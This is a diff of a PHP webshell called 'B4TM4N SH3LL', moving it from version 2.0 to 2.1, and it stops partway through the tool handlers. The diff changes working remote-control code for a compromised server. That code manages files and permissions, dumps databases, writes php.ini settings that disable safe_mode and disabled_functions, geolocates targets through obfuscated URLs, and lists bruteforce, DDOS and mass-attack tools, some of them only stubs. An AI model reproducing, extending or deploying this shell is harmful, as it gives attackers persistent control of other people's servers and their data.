@@ -2,7 +2,7 @@
 /* 
  * B4TM4N SH3LL is PHP WEBSHELL
  *
- * Feature:
+ * Features:
  *		[0] File Manager
  *		[1] Sec. Info
  *		[2] Simply Database
@@ -17,7 +17,7 @@ $config=[
 	"user"    => "zaIgxSRawZ==",                             // B64E('user')
 	"pass"    => "42b378d7eb719b4ad9c908601bdf290d541c9c3a", // sha1(md5('pass'))
 	"title"   => "B4TM4N SH3LL",                             // Title
-	"version" => "2.0",                                      // Version
+	"version" => "2.1",                                      // Version
 	"debug"   => true                                        // Debug Mode
 ];
 
@@ -187,14 +187,15 @@ $start=microtime(true); // Time Pageload
 <meta name='author' content='k4mpr3t'/>
 <link href="data:image/png;base64,AAABAAEAEBACAAAAAACwAAAAFgAAACgAAAAQAAAAIAAAAAEAAQAAAAAAQAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAA//8AAP//AAD//wAA//8AAP7/AAD8fwAAwAcAAMAHAACMYwAADWEAAP//AAD//wAA//8AAP//AAD//wAA" rel="icon" type="image/x-icon" />
 <style type="text/css">
-	
-	*,html{margin:0;padding:0;line-height:1rem}
-	body{background:black;color:lime;font-family:monospace;font-size:13px}
-	a{color:lime;text-decoration:none}
-	a:hover{color:white}
-	::-moz-selection{background:red;color:white}
-	::selection{background:red;color:white}
-	img{vertical-align:bottom}
+
+	*,html{margin:0;padding:0;line-height:1rem} 
+	body{background:black;color:lime;font-family:monospace;font-size:13px} 
+	a{color:lime;text-decoration:none} 
+	a:hover{color:white} 
+	hr{border:1px solid #111;margin:3px 0px 0px} 
+	img{vertical-align:bottom} 
+	::-moz-selection{background:red;color:white} 
+	::selection{background:red;color:white} 
 
 	#wrapper{width:93%;margin:37px auto 40px}
 	#info{margin:0 0 23px 0;padding:0 13px 0 0}
@@ -223,6 +224,9 @@ $start=microtime(true); // Time Pageload
 	.divide-right{float:right;width:50%}
 
 	#php-configuration{text-align:center}
+
+	#update{text-align:center}
+	#process-list{padding:25px;margin:auto;width: 50%}
 	
 	.tools-header{margin-bottom:20px;padding-bottom:25px;text-align:center;border-bottom:1px solid #111}
 
@@ -1210,7 +1214,7 @@ if(any("r",$_REQUEST))
 			}
 			else
 			{
-				$_SESSION['status']="Whoops,something went wrong...";
+				$_SESSION['status']="Whoops, something went wrong...";
 			}
 			header("location:".php_self."?a=e&r=".urle($file));
 		}
@@ -1232,7 +1236,7 @@ if(any("r",$_REQUEST))
 			$newname=$path['dirname']._.trim($_REQUEST['name']);
 			if(!rename(trim($file),$newname)) 
 			{
-			    $_SESSION['status']='Whoops,something went wrong...';
+			    $_SESSION['status']='Whoops, something went wrong...';
 			} 
 			else 
 			{
@@ -1257,7 +1261,7 @@ if(any("r",$_REQUEST))
 			$octal=octdec($_REQUEST['octal']);
 			if(!chmod(trim($file),$octal)) 
 			{
-			    $_SESSION['status']='Whoops,something went wrong...';
+			    $_SESSION['status']='Whoops, something went wrong...';
 			} 
 			else 
 			{
@@ -1289,7 +1293,7 @@ if(any("r",$_REQUEST))
 			$own=$_REQUEST['own'];
 			if(!chown(trim($file),$own)) 
 			{
-			    $_SESSION['status']='Whoops,something went wrong...';
+			    $_SESSION['status']='Whoops, something went wrong...';
 			} 
 			else 
 			{
@@ -1321,7 +1325,7 @@ if(any("r",$_REQUEST))
 			$grp=$_REQUEST['grp'];
 			if(!chgrp(trim($file),$grp)) 
 			{
-				$_SESSION['status']='Whoops,something went wrong...';
+				$_SESSION['status']='Whoops, something went wrong...';
 			} 
 			else 
 			{
@@ -1346,7 +1350,7 @@ if(any("r",$_REQUEST))
 			$time=$_REQUEST['time'];
 			if(!touch(trim($file),strtotime($time))) 
 			{
-			    $_SESSION['status']='Whoops,something went wrong...';
+			    $_SESSION['status']='Whoops, something went wrong...';
 			} 
 			else 
 			{
@@ -1475,7 +1479,7 @@ if(any("r",$_REQUEST))
 				{
 					if(!copy(trim($source),trim($dest))) 
 					{
-					    $_SESSION['status']='Whoops,cannot copying...';
+					    $_SESSION['status']='Whoops, cannot copying...';
 					} 
 					else 
 					{
@@ -1486,7 +1490,7 @@ if(any("r",$_REQUEST))
 				{
 					if(!copy(trim($source),trim($dest))) 
 					{
-					    $_SESSION['status']='Whoops,cannot moving...';
+					    $_SESSION['status']='Whoops, cannot moving...';
 					} 
 					else 
 					{
@@ -1497,14 +1501,14 @@ if(any("r",$_REQUEST))
 					   }
 					    else
 					    {
-					    	$_SESSION['status']='Whoops,just copying...';
+					    	$_SESSION['status']='Whoops, just copying...';
 					   }
 					}
 				}
 			}
 			else
 			{
-				$_SESSION['status']="Whoops,File was Exists <a href=?a=v&r='" . urle($dest) . "'>'" . basename($dest) . "'</a>";
+				$_SESSION['status']="Whoops, File was Exists <a href=?a=v&r='" . urle($dest) . "'>'" . basename($dest) . "'</a>";
 			}
 
 			if($_REQUEST['a']=='cp')
@@ -1677,26 +1681,24 @@ if(any("x",$_REQUEST))
 			printf("<div class='database-session'>
 					<div class='database-query'>
 						<form action='?x=db&q=db' method='post'>
-							<input type='submit' name='disconnect' value='Disconnect' />
-						</form>
-						<form action='?x=db&q=db' method='post'><br>
-							<label>MYSQL Query</label> <br>
+							<label>MYSQL Query<hr></label><br>
 							<label><i style='color:#222'>
 								show databases;<br>
 								show tables from {database};<br>
 								show columns from {database}.{table};<br>
 								select * from {database}.{table};</i></label>
 							<textarea id='query' name='query'>%s</textarea><br>
-							<input type='submit' value='Execute' />
+							<input type='submit' name='disconnect' value='Disconnect'/>
+							<input type='submit' value='Execute'/>
 						</form>
 					</div>",(isset($_SESSION['query'])?$_SESSION['query']:''),gethostbyname(http_host));
 
-			$table="";
-			$sql=@mysql_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass']);
+			$process="";
+			$sql=mysql_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass']);
 			$result=mysql_list_processes($sql);
 			while ($row=mysql_fetch_assoc($result))
 			{
-			    $table.=sprintf("<tr>
+			    $process.=sprintf("<tr>
 			    	<td>%s</td>
 			    	<td>%s</td>
 			    	<td>%s</td>
@@ -1707,7 +1709,7 @@ if(any("x",$_REQUEST))
 			
 			printf("<div class='database-process'>
 					<div id='mysql-process-result'>
-						<label>Database Process</label>
+						<label>Database Process<hr></label>
 						<table class='table table-bordered'>
 							<thead>
 								<tr>
@@ -1721,10 +1723,10 @@ if(any("x",$_REQUEST))
 							<tbody>%s</tbody>
 						</table>
 					</div>
-			",$table);
+			",$process);
 
 			printf("<div id='database-dump'>
-					<label>Database Dump</label>
+					<label>Database Dump<hr></label>
 					<form action='?x=db&xa=dmp' method='post'><br>
 						<label>Database</label><input type='text' name='database' value=''/><br>
 						<label>Output</label><input type='text' name='output' value='%s'/><br>
@@ -1741,7 +1743,7 @@ if(any("x",$_REQUEST))
 						<label>Port</label><input type='text' name='port' value='3306'/><br>
 						<label>Username</label><input type='text' name='user' value='root'/><br>
 						<label>Password</label><input type='text' name='pass' value=''/><br>
-						<input type='submit' value='Connect' />
+						<input type='submit' value='Connect'/>
 					</form>
 				</div>",gethostbyname(http_host));
 		}
@@ -1769,6 +1771,7 @@ if(any("x",$_REQUEST))
 
 		if(any("q",$_REQUEST)&&$_REQUEST['q']=="db")
 		{
+			$_SESSION['status']='';
 			$sql=@mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);
 
 			if(isset($_REQUEST['disconnect']))
@@ -1831,74 +1834,70 @@ if(any("x",$_REQUEST))
 	    	$database=$_REQUEST['database'];
 	    	$output=$_REQUEST['output'];
 
-		    if (!file_exists($output)&&!empty($database)) 
-		    {
-		        $link=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);
-		        mysqli_set_charset($link,'utf8');
-		        mysqli_select_db($link,$database);
-		        $tables=array();
-		        $result=mysqli_query($link,'SHOW TABLES');
-		        while($row=mysqli_fetch_row($result))
+			if (!file_exists($output)&&!empty($database)) 
+			{
+			    $link=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);
+			    mysqli_set_charset($link,'utf8');
+			    mysqli_select_db($link,$database);
+			    $tables=array();
+			    $result=mysqli_query($link,'SHOW TABLES');
+			    while($row=mysqli_fetch_row($result))
 				{
 					$tables[]=$row[0];
 				}
-		        $return='SET FOREIGN_KEY_CHECKS=0;' . "\r\n";
-		        $return.='SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";' . "\r\n";
-		        $return.='SET AUTOCOMMIT=0;' . "\r\n";
-		        $return.='START TRANSACTION;' . "\r\n";
-		        foreach($tables as $table)
-		        {
-		            $result=mysqli_query($link,'SELECT * FROM '.$table);
-		            $num_fields=mysqli_num_fields($result);
-		            $num_rows=mysqli_num_rows($result);
-		            $i_row=0;
-		            $row2=mysqli_fetch_row(mysqli_query($link,'SHOW CREATE TABLE '.$table));
-		            $return.="\n\n".$row2[1].";\n\n";
-		            if ($num_rows!==0) {
-		                $row3=@mysqli_fetch_fields($result);
-		                $return.='INSERT INTO '.$table.'( ';
-		                foreach ($row3 as $th) 
-		                { 
-		                    $return.='`'.$th->name.'`,';
-		               }
-		                $return=substr($return,0,-2);
-		                $return.=' ) VALUES';
-		                for ($i=0;$i < $num_fields;$i++) 
-		                {
-		                    while($row=mysqli_fetch_row($result))
-		                    {
-		                        $return.="\n(";
-		                        for($j=0;$j<$num_fields;$j++) 
-		                        {
-		                            $row[$j]=addslashes($row[$j]);
-		                            $row[$j]=preg_replace("#\n#","\\n",$row[$j]);
-		                            if (isset($row[$j])) { $return.='"'.$row[$j].'"' ;} else { $return.='""';}
-		                            if ($j<($num_fields-1)) { $return.=',';}
-		                       }
-		                        if (++$i_row==$num_rows) {
-		                            $return.=");";
-		                       } else {
-		                            $return.="),";
-		                       }   
-		                   }
-		               }
-		           }
-		            $return.="\n\n\n";
-		       }
-		        $return .='SET FOREIGN_KEY_CHECKS=1;' . "\r\n";
-		        $return.='COMMIT;';
-
-		        $handle=fopen($output,'w+');
-		        fwrite($handle,$return);
-		        fclose($handle);
-
+			    $return='SET FOREIGN_KEY_CHECKS=0;' . "\r\n";
+			    $return.='SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";' . "\r\n";
+			    $return.='SET AUTOCOMMIT=0;' . "\r\n";
+			    $return.='START TRANSACTION;' . "\r\n";
+			    foreach($tables as $table)
+			    {
+			        $result=mysqli_query($link,'SELECT * FROM '.$table);
+			        $num_fields=mysqli_num_fields($result);
+			        $num_rows=mysqli_num_rows($result);
+			        $i_row=0;
+			        $row2=mysqli_fetch_row(mysqli_query($link,'SHOW CREATE TABLE '.$table));
+			        $return.="\n\n".$row2[1].";\n\n";
+			        if ($num_rows!==0) {
+			            $row3=@mysqli_fetch_fields($result);
+			            $return.='INSERT INTO '.$table.'( ';
+			            foreach ($row3 as $th) 
+			            { 
+			                $return.='`'.$th->name.'`,';
+			           }
+			            $return=substr($return,0,-2);
+			            $return.=' ) VALUES';
+			            for ($i=0;$i < $num_fields;$i++) 
+			            {
+			                while($row=mysqli_fetch_row($result))
+			                {
+			                    $return.="\n(";
+			                    for($j=0;$j<$num_fields;$j++) 
+			                    {
+			                        $row[$j]=addslashes($row[$j]);
+			                        $row[$j]=preg_replace("#\n#","\\n",$row[$j]);
+			                        if (isset($row[$j])) { $return.='"'.$row[$j].'"' ;} else { $return.='""';}
+			                        if ($j<($num_fields-1)) { $return.=',';}
+			                   }
+			                    if (++$i_row==$num_rows) {
+			                        $return.=");";
+			                   } else {
+			                        $return.="),";
+			                   }   
+			               }
+			           }
+			       }
+			        $return.="\n\n\n";
+			   }
+			    $return .='SET FOREIGN_KEY_CHECKS=1;' . "\r\n";
+			    $return.='COMMIT;';
+			    $output=end(explode(".",$output))=='sql'?$output:$output.'.sql';
+			    $handle=fopen($output,'w+');
+			    fwrite($handle,$return);
+			    fclose($handle);
 				$_SESSION['status']=sprintf("Dump with success... <a href='?a=v&r=%s'>'%s'</a>",urle($output),basename($output));	    
+			}
 
-		   }
-		    else
-		    {
-		    	$_SESSION['status']="Whoops,Filename Exists...";
-		   }
+			header('location:'.php_self.'?x=db');
 		}
 	}
 	if($_REQUEST['x']=="terminal")
@@ -2081,6 +2080,8 @@ if(any("x",$_REQUEST))
 	{
 		$php_ini="upload_max_filesize=40M\npost_max_size=40M\nsafe_mode=Off\ndisable_functions =\nsafe_mode_gid=Off\nopen_basedir=Off\nregister_globals=on\nexec=On\nshell_exec=On";
 		$htaccess="Options All\nAllow from all\nSatisfy Any";
+
+		print "Coming Soon";
 	}
 	if($_REQUEST['x']=="php")
 	{	
@@ -2121,6 +2122,10 @@ if(any("x",$_REQUEST))
 			if(file_exists("/usr/bin/perl"))
 			{
 				$path_perl="/usr/bin/perl";
+			}
+			else
+			{
+				$path_perl="/usr/bin/env";
 			}
 		}
 		else
@@ -2259,8 +2264,7 @@ if(any("x",$_REQUEST))
 	}
 	if($_REQUEST['x']=='shells')
 	{
-		echo Execute('perl -v');
-		echo Execute('perl -v');
+		print "Coming Soon";
 	}
 	if($_REQUEST['x']=="account")
 	{
@@ -2311,203 +2315,327 @@ if(any("x",$_REQUEST))
 	}
 	if($_REQUEST['x']=="action")
 	{
-		if(any('action-button',$_REQUEST))
+		$files=any('chk',$_REQUEST)?$_REQUEST['chk']:[];
+		$value=any('action-value',$_REQUEST)?$_REQUEST['action-value']:$_REQUEST['action-option'];
+		$tmp="";
+		$row="";
+		$count_dirs=0;
+		$count_files=0;
+		
+		foreach($files as $file)
 		{
-			$files=any('chk',$_REQUEST)?$_REQUEST['chk']:[];
-			$value=any('action-value',$_REQUEST)?$_REQUEST['action-value']:$_REQUEST['action-option'];
-			$tmp="";
-			$row="";
-			$count_dirs=0;
-			$count_files=0;
-			
-			foreach($files as $file)
+			if(is_dir(urld($file)))
 			{
-				if(is_dir(urld($file)))
-				{
-					$count_dirs++;
-				}
-				if(is_file(urld($file)))
-				{
-					$count_files++;
-				}
-
-				$row.="<tr><td>".urld($file)."</td></tr>";
-				$tmp.=urld($file).",";
+				$count_dirs++;
+			}
+			if(is_file(urld($file)))
+			{
+				$count_files++;
 			}
 
-			if(!any('xa',$_REQUEST)&&$value!='delete')
-			{
-				printf("<h4>Dir's: [%s] File's: [%s]</h4>
-						<table class='table'>%s</table>
-							<form class='new' method='post' action='?x=action&xa=option'>
-							<script>window.onload=function(e){document.getElementById('action_option').value='%s'}</script>
-							<select name='action-option' id='action_option'>
-								<option value='copy'>Copy</option>
-								<option value='move'>Move</option>
-								<option value='delete'>Delete</option>
-								<option value='zip'>Archive (zip)</option>
-								<option value='unzip'>Extract to (zip)</option>
-							</select>
-							<i>-></i>
-							<input type='hidden' name='tmp' value='%s'/>
-							<input type='text' name='newloc' value='%s'/>
-							<input type='submit' value='Submit' name='action-button'/>
-						</form>",$count_dirs,$count_files,$row,$value,$tmp,$dir._);
-			}
+			$row.="<tr><td>".urld($file)."</td></tr>";
+			$tmp.=urld($file).",";
+		}
 
-			if(any('xa',$_REQUEST)&&$_REQUEST['xa']=='option')
-			{
-				$files=array_filter(explode(',',$_REQUEST['tmp']));
-				$newloc=trim($_REQUEST['newloc']);
-				$succ=0;
-				$fail=0;
+		if(!any('xa',$_REQUEST)&&$value=='delete')
+		{
+			printf("<h4>Dir's: [%s] File's: [%s]</h4>
+					<table class='table'>%s</table>
+					<form class='new' method='post' action='?x=action&xa=option'>
+						<input type='hidden' name='action-option' value='%s'/>
+						<input type='hidden' name='tmp' value='%s'/>
+						<input type='submit' value='Remove'/>
+					</form>",
+					$count_dirs,
+					$count_files,
+					$row,
+					$value,
+					$tmp);
+		}
 
-				if($_REQUEST['action-option']=='copy')
+		if(!any('xa',$_REQUEST)&&$value!='delete')
+		{
+			printf("<h4>Dir's: [%s] File's: [%s]</h4>
+					<table class='table'>%s</table>
+					<form class='new' method='post' action='?x=action&xa=option'>
+						<script>window.onload=function(e){document.getElementById('action_option').value='%s'}</script>
+						<select name='action-option' id='action_option'>
+							<option value='copy'>Copy</option>
+							<option value='move'>Move</option>
+							<option value='zip'>Archive (zip)</option>
+							<option value='unzip'>Extract to (zip)</option>
+						</select>
+						<i>-></i>
+						<input type='hidden' name='tmp' value='%s'/>
+						<input type='text' name='newloc' value='%s'/>
+						<input type='submit' value='Process'/>
+					</form>",
+					$count_dirs,
+					$count_files,
+					$row,
+					$value,
+					$tmp,
+					$dir._);
+		}
+
+		if(any('xa',$_REQUEST)&&$_REQUEST['xa']=='option')
+		{
+			$files=array_filter(explode(',',$_REQUEST['tmp']));
+			$newloc=trim(@$_REQUEST['newloc']);
+			$succ=0;
+			$fail=0;
+
+			if($_REQUEST['action-option']=='copy')
+			{
+				if(file_exists($newloc)&&is_dir($newloc))
 				{
-					if(file_exists($newloc)&&is_dir($newloc))
+					foreach($files as $file)
 					{
-						foreach($files as $file)
+						if(CopyRecursive($file,rtrim($newloc,_)._.basename($file)))
 						{
-							if(CopyRecursive($file,rtrim($newloc,_)._.basename($file)))
-							{
-								$succ++;
-							}
-							else
-							{
-								$fail++;
-							}
+							$succ++;
 						}
-						echo "Success: $succ | Failed: $fail";
+						else
+						{
+							$fail++;
+						}
+					}
+					echo "Success: $succ | Failed: $fail";
+				}
+				else
+				{
+					echo "Target not exists !";
+				}
+			}
+
+			if($_REQUEST['action-option']=='move')
+			{
+				if(file_exists($newloc)&&is_dir($newloc))
+				{
+					foreach($files as $file)
+					{
+						if(MoveRecursive($file,rtrim($newloc,_)._.basename($file)))
+						{
+							$succ++;
+						}
+						else
+						{
+							$fail++;
+						}
+					}
+					echo "Success: $succ | Failed: $fail";
+				}
+				else
+				{
+					echo "Target not exists !";
+				}
+			}
+
+			if($_REQUEST['action-option']=='delete')
+			{
+				foreach($files as $file)
+				{
+					if(Remove($file))
+					{
+						$succ++;
 					}
 					else
 					{
-						echo "Target not exists !";
+						$fail++;
 					}
 				}
+				echo "Success: $succ | Failed: $fail";
+			}
 
-				if($_REQUEST['action-option']=='move')
+			if($_REQUEST['action-option']=='zip')
+			{
+				if(end(explode(".",$newloc))=='zip')
 				{
-					if(file_exists($newloc)&&is_dir($newloc))
+					$zip = new ZipArchive;
+
+					if ($zip->open($newloc,ZipArchive::CREATE|ZipArchive::OVERWRITE) === TRUE) 
 					{
 						foreach($files as $file)
 						{
-							if(MoveRecursive($file,rtrim($newloc,_)._.basename($file)))
+							if(is_dir($file))
 							{
-								$succ++;
-							}
-							else
-							{
-								$fail++;
-							}
-						}
-						echo "Success: $succ | Failed: $fail";
-					}
-					else
-					{
-						echo "Target not exists !";
-					}
-				}
+								$zip->addEmptyDir(basename($file));
 
-				if($_REQUEST['action-option']=='zip')
-				{
-					if(end(explode(".",$newloc))=='zip')
-					{
-						$zip = new ZipArchive;
+								$recur = new RecursiveIteratorIterator(
+								    new RecursiveDirectoryIterator($file),
+								    RecursiveIteratorIterator::LEAVES_ONLY 
+								);
 
-						if ($zip->open($newloc,ZipArchive::CREATE|ZipArchive::OVERWRITE) === TRUE) 
-						{
-							foreach($files as $file)
-							{
-								if(is_dir($file))
+								foreach ($recur as $key => $val) 
 								{
-									$zip->addEmptyDir(basename($file));
-
-									$recur = new RecursiveIteratorIterator(
-									    new RecursiveDirectoryIterator($file),
-									    RecursiveIteratorIterator::LEAVES_ONLY 
-									);
-
-									foreach ($recur as $key => $val) 
+								    if(basename($key)!="..")
 									{
-									    if(basename($key)!="..")
+									    if(is_dir($key))
 										{
-										    if(is_dir($key))
-											{
-												$zdir=str_replace($file,basename($file),realpath($key));
-												$zip->addEmptyDir($zdir);
-											}
-											elseif(is_file($key))
-											{
-												$zfile=str_replace($file,basename($file),realpath($key));
-												$zip->addFile(realpath($key),$zfile);
-											}
+											$zdir=str_replace($file,basename($file),realpath($key));
+											$zip->addEmptyDir($zdir);
+										}
+										elseif(is_file($key))
+										{
+											$zfile=str_replace($file,basename($file),realpath($key));
+											$zip->addFile(realpath($key),$zfile);
 										}
 									}
 								}
-								elseif(is_file($file))
-								{
-									$zip->addFile($file, basename($file));
-								}
 							}
-
-						    $zip->close();
-						    echo 'Zip Created';
-						} 
-						else 
-						{
-						    echo 'Failed';
+							elseif(is_file($file))
+							{
+								$zip->addFile($file, basename($file));
+							}
 						}
 
-					}
-					else
+					    $zip->close();
+					    echo 'Zip Created';
+					} 
+					else 
 					{
-						echo 'Extension must Zip';
+					    echo 'Failed';
 					}
 				}
-
-				if($_REQUEST['action-option']=='unzip')
+				else
 				{
-					if(file_exists($newloc)&&is_dir($newloc))
+					echo 'Extension must Zip';
+				}
+			}
+
+			if($_REQUEST['action-option']=='unzip')
+			{
+				if(file_exists($newloc)&&is_dir($newloc))
+				{
+					foreach($files as $file)
 					{
-						foreach($files as $file)
+						if(end(explode(".",$file))=='zip')
 						{
-							if(end(explode(".",$file))=='zip')
+							$zip = new ZipArchive;
+					
+							if ($zip->open($file) === TRUE) 
 							{
-								$zip = new ZipArchive;
-						
-								if ($zip->open($file) === TRUE) 
-								{
-								    $zip->extractTo($newloc);
-								    $zip->close();
-								    $succ++;
-								} 
-								else 
-								{
-								    $fail++;
-								}
-							}
+							    $zip->extractTo($newloc);
+							    $zip->close();
+							    $succ++;
+							} 
 							else 
 							{
 							    $fail++;
 							}
-							
 						}
-						echo "Success: $succ | Failed: $fail";
+						else 
+						{
+						    $fail++;
+						}
+						
 					}
-					else
-					{
-						echo "Target not exists !";
-					}
+					echo "Success: $succ | Failed: $fail";
+				}
+				else
+				{
+					echo "Target not exists !";
 				}
 			}
 		}
-		if(any('find-button',$_REQUEST))
+	}
+	if($_REQUEST['x']=="find")
+	{
+		$recur = new RecursiveIteratorIterator(
+		    new RecursiveDirectoryIterator($dir),
+		    RecursiveIteratorIterator::LEAVES_ONLY 
+		);
+
+		if(any('find-value',$_REQUEST)&&!empty($_REQUEST['find-value']))
 		{
-			echo 'asu';
+			$result="";
+			$res_=0;
+			$no=1;
+
+			foreach ($recur as $key => $val) 
+			{
+				if(basename($key)!="..")
+				{
+					if(strpos(realpath($key),$_REQUEST['find-value'])!== false) 
+					{
+						$result.=sprintf("<tr>
+								<td><center>%d</center></td>
+								<td><a href='?g=%s' title='%s' target='_blank'>%s</a></td>
+								<td><a href='?g=%s' title='%s' target='_blank'>%s</a></td>
+								<td><center>%s</center></td>
+								</tr>",
+								$no++,
+								substr(realpath($key),0,strrpos(realpath($key),_)),
+								substr(realpath($key),0,strrpos(realpath($key),_)),
+								substr(realpath($key),0,strrpos(realpath($key),_)),
+								realpath($key),
+								realpath($key),
+								basename(realpath($key)),
+								GetFileTime(realpath($key),'modify')
+						);
+
+						$res_++;
+					}
+				}
+			}
+
+			printf("<label>Find: '%s' | Found's: %s</label>
+					<table class='table sortable'>
+						<thead>
+							<tr>
+								<th>No.</th>
+								<th>Directory</th>
+								<th>Filename</th>
+								<th>Modified</th>
+							</tr>
+						<tbody>%s</tbody>
+					</table>",$_REQUEST['find-value'],$res_,$result);
+
+		}
+		else
+		{
+			echo 'Whoops, Nothing Find !';
 		}
 	}
 	if($_REQUEST['x']=="update")
 	{
+		$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';
+		$current_version=2.1; //Sensitive Case Variable
+
+		if($config['debug']==true)
+		{
+			$git_script=htmlentities(file_get_contents(__FILE__));
+			$latest_version=$current_version+0.1; //Test Update latest version -/+ 0.1
+		}
+		else
+		{
+			$git_script=GetUrlContent($link_update);
+			$get_version=strpos($git_script,"current_version");
+			$latest_version=substr($git_script,$get_version+16,3);
+		}
+
+		$status="";
+		if((float)$latest_version>=(float)$current_version)
+		{
+			if($config['debug']==true)
+			{
+				$status.='New Version Available<br>Setting Debug to False for Activate this Feature';
+			}
+			else
+			{
+				$status.='New Version Available<br>Download -> [<font class="on"><a href="'.$link_update.'" >link</a></font>]';
+			}
+		}
+		else
+		{
+			$status.='Latest Version '.$config['version'];
+		}
+
+		Printf("<div id='update'>
+					<a href='https://www.gnu.org/licenses/gpl-3.0.txt' target='_blank'>
+						<img src='https://www.gnu.org/graphics/lgplv3-88x31.png'/>
+					</a><br><br>%s
+				</div>",$status);
 	}
 }
 
@@ -2521,7 +2649,7 @@ if(any("z",$_REQUEST))
 		"port-scanner"=>["title"=>"Scan Port","ver"=>"1.0","auth"=>"k4mpr3t"],
 		"script-loader"=>["title"=>"Script Loader","ver"=>"1.0","auth"=>"k4mpr3t"],
 		"encryptor"=>["title"=>"Encryptor","ver"=>"1.0","auth"=>"k4mpr3t"],
-		"form-email-bruteforces"=>["title"=>"Form Email Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"],
+		"frmail-bruteforces"=>["title"=>"Form Email Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"],
 		"login-bruteforces"=>["title"=>"Login Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"],
 		"mass-tools"=>["title"=>"Mass Tools","ver"=>"1.0","auth"=>"k4mpr3t"],
 		"ddos-attack"=>["title"=>"DDOS Attack","ver"=>"1.0","auth"=>"k4mpr3t"],
@@ -2535,6 +2663,47 @@ if(any("z",$_REQUEST))
 					<h2>Nothing Is Secure...</h2>
 					<h3>WHY SO serious ?!</h3>
 				</div>");
+	}
+	if($z=="target-map")
+	{
+		echo "<div class='tools-header'>
+				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
+				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
+			  </div>";
+
+		printf("<div id='target-map'>
+			<form onsubmit='return false;' class='new'>
+				<input type='text' id='map-ip' value='%s'/>
+				<input type='submit' value='Trace' onclick=\"return getAjax(true,'target-info','POST','?z=target-map&ip='+document.getElementById('map-ip').value);\"/><br>
+			</form>
+		</div>
+		<div id='target-info' class='result'></div>",gethostbyname(http_host));
+
+		if(any("ip",$_REQUEST))
+		{
+			ob_clean();
+			$ip=!empty($_REQUEST['ip']) ? $_REQUEST['ip'] : gethostbyname(http_host);
+			$valid=filter_var($ip,FILTER_VALIDATE_IP) or die('Invalid IP Address');
+			if($_REQUEST['ip']==gethostbyname(http_host)) 
+			{
+				$url=B64D("zSI9xWleO7AbADEmAD0kxX4fACJezmMeyt==");
+				$geoip=GetUrlContent($url);
+				$json=json_decode($geoip,true);
+				$ip=$json['query'];
+			}
+			$url=sprintf(B64D("zSI9xWleO7AbADEmAD0kxX4fACJezmMeyt==")."/%s",$ip);
+			$geoip=GetUrlContent($url);
+			$json=json_decode($geoip,true);
+			$url=sprintf(B64D("zSI9xSN3Ob0gBCYaOnwey7whAH4kwX0gBCYa")."?q=%s,%s&z=10&output=embed",$json['latitude'],$json['longitude']);
+			printf("<h3 align='center'><font class='on'>%s (%s) | %s, %s</font></h3><br>
+					<iframe src='%s' width='100%%' height='345' frameBorder='0'><iframe>",
+					$json['country_name'],
+					$json['country_code'],
+					$json['city'],
+					$json['region_name'],
+					$url);
+			exit;
+		}
 	}
 	if($z=="port-scanner")
 	{
@@ -2668,6 +2837,8 @@ if(any("z",$_REQUEST))
 							<option value='strrev'>String Reverse</option>
 							<option value='base64_encode'>Base64 Encode</option>
 							<option value='base64_decode'>Base64 Decode</option>
+							<option value='B64E'>B64E</option>
+							<option value='B64D'>B64D</option>
 							<option value='entties'>Htmlentities</option>
 							<option value='spechar'>Htmlspecialchars</option>
 						</select>
@@ -2822,6 +2993,8 @@ if(any("z",$_REQUEST))
 					case "spechar":print htmlspecialchars($text);break;
 					case "base64_encode":print base64_encode($text);break;
 					case "base64_decode":print base64_decode($text);break;
+					case "B64E":print B64E($text);break;
+					case "B64D":print B64D($text);break;
 				}
 			}
 			elseif($opt=='extra')
@@ -2860,46 +3033,21 @@ if(any("z",$_REQUEST))
 			exit;
 		}
 	}
-	if($z=="target-map")
+	if($z=="frmail-bruteforces")
 	{
-		echo "<div class='tools-header'>
-				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
-				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
-			  </div>";
-
-		printf("<div id='target-map'>
-			<form onsubmit='return false;' class='new'>
-				<input type='text' id='map-ip' value='%s'/>
-				<input type='submit' value='Trace' onclick=\"return getAjax(true,'target-info','POST','?z=target-map&ip='+document.getElementById('map-ip').value);\"/><br>
-			</form>
-		</div>
-		<div id='target-info' class='result'></div>",gethostbyname(http_host));
-
-		if(any("ip",$_REQUEST))
-		{
-			ob_clean();
-			$ip=!empty($_REQUEST['ip']) ? $_REQUEST['ip'] : gethostbyname(http_host);
-			$valid=filter_var($ip,FILTER_VALIDATE_IP) or die('Invalid IP Address');
-			if($_REQUEST['ip']==gethostbyname(http_host)) 
-			{
-				$url=B64D("zSI9xWleO7AbADEmAD0kxX4fACJezmMeyt==");
-				$geoip=GetUrlContent($url);
-				$json=json_decode($geoip,true);
-				$ip=$json['query'];
-			}
-			$url=sprintf(B64D("zSI9xWleO7AbADEmAD0kxX4fACJezmMeyt==")."/%s",$ip);
-			$geoip=GetUrlContent($url);
-			$json=json_decode($geoip,true);
-			$url=sprintf(B64D("zSI9xSN3Ob0gBCYaOnwey7whAH4kwX0gBCYa")."?q=%s,%s&z=10&output=embed",$json['latitude'],$json['longitude']);
-			printf("<h3 align='center'><font class='on'>%s (%s) | %s, %s</font></h3><br>
-					<iframe src='%s' width='100%%' height='345' frameBorder='0'><iframe>",
-					$json['country_name'],
-					$json['country_code'],
-					$json['city'],
-					$json['region_name'],
-					$url);
-			exit;
-		}
+		print "Coming Soon";
+	}
+	if($z=="login-bruteforces")
+	{
+		print "Coming Soon";
+	}
+	if($z=="mass-tools")
+	{
